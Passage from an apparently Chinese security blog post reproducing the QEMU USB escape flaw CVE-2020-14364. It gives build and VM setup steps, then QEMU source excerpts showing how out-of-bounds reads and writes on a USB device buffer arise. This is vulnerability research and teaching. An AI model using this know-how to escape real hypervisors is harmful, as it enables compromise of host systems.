

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="https://i.postimg.cc/SsrHG3pr/preview.jpg">
  <link rel="icon" href="https://i.postimg.cc/SsrHG3pr/preview.jpg">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="5Y2z">
  <meta name="keywords" content="">
  
    <meta name="description" content="救赎之道，就在其中">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2020-14364-Qemu逃逸漏洞复现">
<meta property="og:url" content="http://yzsandw.com/2025/12/04/CVE-2020-14364-Qemu%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="5Y2z_blog">
<meta property="og:description" content="救赎之道，就在其中">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/hmr8rsGqDO1z4140.jpg">
<meta property="article:published_time" content="2025-12-04T02:09:26.000Z">
<meta property="article:modified_time" content="2025-12-15T13:02:12.730Z">
<meta property="article:author" content="5Y2z">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/hmr8rsGqDO1z4140.jpg">
  
  
  
  <title>CVE-2020-14364-Qemu逃逸漏洞复现 - 5Y2z_blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"yzsandw.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2023-6-11","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  



  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>5Y2z_blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/hmr8rsGqDO1z4140.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CVE-2020-14364-Qemu逃逸漏洞复现"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-12-04 10:09" pubdate>
          2025年12月4日 上午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          4.4k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          37 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">CVE-2020-14364-Qemu逃逸漏洞复现</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="00-前言">00 前言</h1>
<p>为了完成课程任务，不得不提前来学习一下Qemu逃逸的知识，这部分内容本来打算把pwn的基础打好之后再来接触，但是既然是课程要求那就没办法了(哭)。</p>
<p>这个漏洞的成因是QEMU的USB后端在实现USB控制器与USB设备通信时存在越界读写漏洞可能导致虚拟机逃逸。</p>
<h1 id="01-环境搭建">01 环境搭建</h1>
<p>安装spice-protocol：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget https://spice-space.org/download/releases/spice-protocol-0.12.10.tar.bz2<br>tar xvf spice-protocol-0.12.10.tar.bz2<br>cd spice-protocol-0.12.10/<br>./configure <br>make<br>sudo make install<br></code></pre></td></tr></table></figure>
<p>安装celt</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget http://downloads.us.xiph.org/releases/celt/celt-0.5.1.3.tar.gz<br>tar zxvf celt-0.5.1.3.tar.gz <br>cd celt-0.5.1.3/<br> ./configure <br> make<br> sudo make install<br></code></pre></td></tr></table></figure>
<p>安装依赖</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install libjpeg-dev<br>sudo apt-get install libsasl2-dev<br></code></pre></td></tr></table></figure>
<p>安装spice-server：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget https://spice-space.org/download/releases/spice-server/spice-0.12.7.tar.bz2<br>tar xvf spice-0.12.7.tar.bz2<br>cd spice-0.12.7/<br>./configure <br> make<br> sudo make install<br></code></pre></td></tr></table></figure>
<p>高版本ld不支持编译qemu4.2.1，降低一下ld版本：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget https://ftp.gnu.org/gnu/binutils/binutils-2.30.tar.gz<br>tar -xvf binutils-2.30.tar.gz<br>cd binutils-2.30<br>./configure --prefix=/usr/local/binutils <br>make -j6<br>sudo make install<br><span class="hljs-meta prompt_"># </span><span class="language-bash">替换掉高版本的ld</span><br>cd /usr/local/binutils<br>sudo mv /usr/bin/ld /usr/bin/ld.back<br>sudo ln -s /usr/local/binutils/bin/ld /usr/bin/ld<br></code></pre></td></tr></table></figure>
<p>编译安装qemu源码，qemu版本为<code>v4.2.1</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone git://git.qemu-project.org/qemu.git<br>cd qemu<br>git checkout tags/v4.2.1<br>mkdir -p bin/debug/naive<br>cd bin/debug/naive<br>../../../configure --target-list=x86_64-softmmu --enable-debug --disable-werror --enable-spice<br>make<br></code></pre></td></tr></table></figure>
<p>编译出来qemu的路径为./qemu/bin/debug/naive/x86_64-softmmu/qemu-system-x86_64</p>
<p>制作一个usb设备：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-img create -f raw disk_01.img 32M<br>mkfs.vfat disk_01.img<br></code></pre></td></tr></table></figure>
<p>拉取一个ubuntu的iso文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget https://releases.ubuntu.com/20.04/ubuntu-20.04.6-live-server-amd64.iso<br></code></pre></td></tr></table></figure>
<p>创建一个qcow2的虚拟机镜像文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-img create -f qcow2 ubuntu.qcow2 20G<br></code></pre></td></tr></table></figure>
<p>启动脚本：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">/opt/qemu/bin/debug/naive/x86_64-softmmu/qemu-system-x86_64 \<br>    -machine q35 \<br>    -m 1G \<br>    -hda ubuntu.qcow2 \<br>    -device e1000,netdev=net0 \<br>    -netdev user,id=net0,hostfwd=tcp::5555-:22 \<br>    -enable-kvm \<br>    -usb \<br>    -cdrom ubuntu-20.04.6-live-server-amd64.iso \<br>    -drive if=none,format=raw,id=disk1,file=/opt/disk_01.img \<br>    -device usb-storage,drive=disk1 \<br>    -device qxl-vga \<br></code></pre></td></tr></table></figure>
<h1 id="02-漏洞分析">02 漏洞分析</h1>
<h2 id="关键结构体">关键结构体</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* definition of a USB device */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">USBDevice</span> &#123;</span><br>    DeviceState qdev;<br>    USBPort *port;<br>    <span class="hljs-type">char</span> *port_path;<br>    <span class="hljs-type">char</span> *serial;<br>    <span class="hljs-type">void</span> *opaque;<br>    <span class="hljs-type">uint32_t</span> flags;<br><br>    <span class="hljs-comment">/* Actual connected speed */</span><br>    <span class="hljs-type">int</span> speed;<br>    <span class="hljs-comment">/* Supported speeds, not in info because it may be variable (hostdevs) */</span><br>    <span class="hljs-type">int</span> speedmask;<br>    <span class="hljs-type">uint8_t</span> addr;<br>    <span class="hljs-type">char</span> product_desc[<span class="hljs-number">32</span>];<br>    <span class="hljs-type">int</span> auto_attach;<br>    <span class="hljs-type">bool</span> attached;<br><br>    <span class="hljs-type">int32_t</span> state;<br>    <span class="hljs-type">uint8_t</span> setup_buf[<span class="hljs-number">8</span>];<br>    <span class="hljs-type">uint8_t</span> data_buf[<span class="hljs-number">4096</span>];		<span class="hljs-comment">// key data</span><br>    <span class="hljs-type">int32_t</span> remote_wakeup;<br>    <span class="hljs-type">int32_t</span> setup_state;<br>    <span class="hljs-type">int32_t</span> setup_len;<br>    <span class="hljs-type">int32_t</span> setup_index;<br><br>    USBEndpoint ep_ctl;<br>    USBEndpoint ep_in[USB_MAX_ENDPOINTS];<br>    USBEndpoint ep_out[USB_MAX_ENDPOINTS];<br><br>    QLIST_HEAD(, USBDescString) strings;<br>    <span class="hljs-type">const</span> USBDesc *usb_desc; <span class="hljs-comment">/* Overrides class usb_desc if not NULL */</span><br>    <span class="hljs-type">const</span> USBDescDevice *device;<br><br>    <span class="hljs-type">int</span> configuration;<br>    <span class="hljs-type">int</span> ninterfaces;<br>    <span class="hljs-type">int</span> altsetting[USB_MAX_INTERFACES];<br>    <span class="hljs-type">const</span> USBDescConfig *config;<br>    <span class="hljs-type">const</span> USBDescIface  *ifaces[USB_MAX_INTERFACES];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIState</span></span><br><span class="hljs-class">&#123;</span><br>    USBBus bus;<br>    DeviceState *device;<br>    qemu_irq irq;<br>    MemoryRegion mem;<br>    AddressSpace *as;<br>    MemoryRegion mem_caps;<br>    MemoryRegion mem_opreg;<br>    MemoryRegion mem_ports;<br>    <span class="hljs-type">int</span> companion_count;<br>    <span class="hljs-type">bool</span> companion_enable;<br>    <span class="hljs-type">uint16_t</span> capsbase;<br>    <span class="hljs-type">uint16_t</span> opregbase;<br>    <span class="hljs-type">uint16_t</span> portscbase;<br>    <span class="hljs-type">uint16_t</span> portnr;<br><br>    <span class="hljs-comment">/* properties */</span><br>    <span class="hljs-type">uint32_t</span> maxframes;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     *  EHCI spec version 1.0 Section 2.3</span><br><span class="hljs-comment">     *  Host Controller Operational Registers</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">uint8_t</span> caps[CAPA_SIZE];<br>    <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>        <span class="hljs-type">uint32_t</span> opreg[<span class="hljs-number">0x44</span> / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint32_t</span>)];<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">        &#123;</span><br>            <span class="hljs-type">uint32_t</span> usbcmd;<br>            <span class="hljs-type">uint32_t</span> usbsts;<br>            <span class="hljs-type">uint32_t</span> usbintr;<br>            <span class="hljs-type">uint32_t</span> frindex;<br>            <span class="hljs-type">uint32_t</span> ctrldssegment;<br>            <span class="hljs-type">uint32_t</span> periodiclistbase;<br>            <span class="hljs-type">uint32_t</span> asynclistaddr;<br>            <span class="hljs-type">uint32_t</span> notused[<span class="hljs-number">9</span>];<br>            <span class="hljs-type">uint32_t</span> configflag;<br>        &#125;;<br>    &#125;;<br>    <span class="hljs-type">uint32_t</span> portsc[NB_PORTS];<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     *  Internal states, shadow registers, etc</span><br><span class="hljs-comment">     */</span><br>    QEMUTimer *frame_timer;<br>    QEMUBH *async_bh;<br>    <span class="hljs-type">bool</span> working;<br>    <span class="hljs-type">uint32_t</span> astate; <span class="hljs-comment">/* Current state in asynchronous schedule */</span><br>    <span class="hljs-type">uint32_t</span> pstate; <span class="hljs-comment">/* Current state in periodic schedule     */</span><br>    USBPort ports[NB_PORTS];<br>    USBPort *companion_ports[NB_PORTS];<br>    <span class="hljs-type">uint32_t</span> usbsts_pending;<br>    <span class="hljs-type">uint32_t</span> usbsts_frindex;<br>    EHCIQueueHead aqueues;<br>    EHCIQueueHead pqueues;<br><br>    <span class="hljs-comment">/* which address to look at next */</span><br>    <span class="hljs-type">uint32_t</span> a_fetch_addr;<br>    <span class="hljs-type">uint32_t</span> p_fetch_addr;<br><br>    USBPacket ipacket;<br>    QEMUSGList isgl;<br><br>    <span class="hljs-type">uint64_t</span> last_run_ns;<br>    <span class="hljs-type">uint32_t</span> async_stepdown;<br>    <span class="hljs-type">uint32_t</span> periodic_sched_active;<br>    <span class="hljs-type">bool</span> int_req_by_async;<br>    VMChangeStateEntry *vmstate;<br>&#125;;<br></code></pre></td></tr></table></figure>
<h2 id="关键函数">关键函数</h2>
<p><code>usb_packet_copy</code> 函数根据<code>p-&gt;pid</code> 判断调用<code>iov_to_buf</code> 函数或者是<code>iov_from_buf</code> 函数。在漏洞利用过程中，<code>iov_from_buf</code>函数将<code>s-&gt;data_buf + s-&gt;setup_index</code> 复制到<code>iov-&gt;iov.base</code> 用户空间中，实现设备空间读。<code>iov_to_buf</code> 函数将<code>iov-&gt;iov.base</code> 复制到<code>s-&gt;data_buf + s-&gt;setup_index</code> 设备空间中，实现设备空间写。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">usb_packet_copy</span><span class="hljs-params">(USBPacket *p, <span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> bytes)</span><br>&#123;<br>    QEMUIOVector *iov = p-&gt;combined ? &amp;p-&gt;combined-&gt;iov : &amp;p-&gt;iov;<br><br>    assert(p-&gt;actual_length &gt;= <span class="hljs-number">0</span>);<br>    assert(p-&gt;actual_length + bytes &lt;= iov-&gt;size);<br>    <span class="hljs-keyword">switch</span> (p-&gt;pid) &#123;<br>    <span class="hljs-keyword">case</span> USB_TOKEN_SETUP:<br>    <span class="hljs-keyword">case</span> USB_TOKEN_OUT:<br>        iov_to_buf(iov-&gt;iov, iov-&gt;niov, p-&gt;actual_length, ptr, bytes);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> USB_TOKEN_IN:<br>        iov_from_buf(iov-&gt;iov, iov-&gt;niov, p-&gt;actual_length, ptr, bytes);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s: invalid pid: %x\n&quot;</span>, __func__, p-&gt;pid);<br>        <span class="hljs-built_in">abort</span>();<br>    &#125;<br>    p-&gt;actual_length += bytes;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">size_t</span><br><span class="hljs-title function_">iov_from_buf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> iovec *iov, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> iov_cnt,</span><br><span class="hljs-params">             <span class="hljs-type">size_t</span> offset, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> bytes)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (__builtin_constant_p(bytes) &amp;&amp; iov_cnt &amp;&amp;<br>        offset &lt;= iov[<span class="hljs-number">0</span>].iov_len &amp;&amp; bytes &lt;= iov[<span class="hljs-number">0</span>].iov_len - offset) &#123;<br>        <span class="hljs-built_in">memcpy</span>(iov[<span class="hljs-number">0</span>].iov_base + offset, buf, bytes);<br>        <span class="hljs-keyword">return</span> bytes;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> iov_from_buf_full(iov, iov_cnt, offset, buf, bytes);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">size_t</span><br><span class="hljs-title function_">iov_to_buf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> iovec *iov, <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> iov_cnt,</span><br><span class="hljs-params">           <span class="hljs-type">size_t</span> offset, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> bytes)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (__builtin_constant_p(bytes) &amp;&amp; iov_cnt &amp;&amp;<br>        offset &lt;= iov[<span class="hljs-number">0</span>].iov_len &amp;&amp; bytes &lt;= iov[<span class="hljs-number">0</span>].iov_len - offset) &#123;<br>        <span class="hljs-built_in">memcpy</span>(buf, iov[<span class="hljs-number">0</span>].iov_base + offset, bytes);<br>        <span class="hljs-keyword">return</span> bytes;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> iov_to_buf_full(iov, iov_cnt, offset, buf, bytes);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>上述<code>iov-&gt;iov.base</code> 是用户可以控制的地址，具体可从以下函数追溯。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ehci_execute</span><br><span class="hljs-comment">// ...</span><br><span class="hljs-keyword">if</span> (p-&gt;async == EHCI_ASYNC_NONE)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ehci_init_transfer(p) != <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br><br>        spd = (p-&gt;pid == USB_TOKEN_IN &amp;&amp; NLPTR_TBIT(p-&gt;qtd.altnext) == <span class="hljs-number">0</span>);<br>        usb_packet_setup(&amp;p-&gt;packet, p-&gt;pid, ep, <span class="hljs-number">0</span>, p-&gt;qtdaddr, spd,<br>                         (p-&gt;qtd.token &amp; QTD_TOKEN_IOC) != <span class="hljs-number">0</span>);<br>        usb_packet_map(&amp;p-&gt;packet, &amp;p-&gt;sgl);<br>        p-&gt;async = EHCI_ASYNC_INITIALIZED;<br>    &#125;<br><span class="hljs-comment">// ...</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">usb_packet_map</span><span class="hljs-params">(USBPacket *p, QEMUSGList *sgl)</span><br>&#123;<br>    DMADirection dir = (p-&gt;pid == USB_TOKEN_IN) ?<br>        DMA_DIRECTION_FROM_DEVICE : DMA_DIRECTION_TO_DEVICE;<br>    <span class="hljs-type">void</span> *mem;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; sgl-&gt;nsg; i++) &#123;<br>        <span class="hljs-type">dma_addr_t</span> base = sgl-&gt;sg[i].base;<br>        <span class="hljs-type">dma_addr_t</span> len = sgl-&gt;sg[i].len;<br><br>        <span class="hljs-keyword">while</span> (len) &#123;<br>            <span class="hljs-type">dma_addr_t</span> xlen = len;<br>            mem = dma_memory_map(sgl-&gt;as, base, &amp;xlen, dir);<br>            <span class="hljs-keyword">if</span> (!mem) &#123;<br>                <span class="hljs-keyword">goto</span> err;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (xlen &gt; len) &#123;<br>                xlen = len;<br>            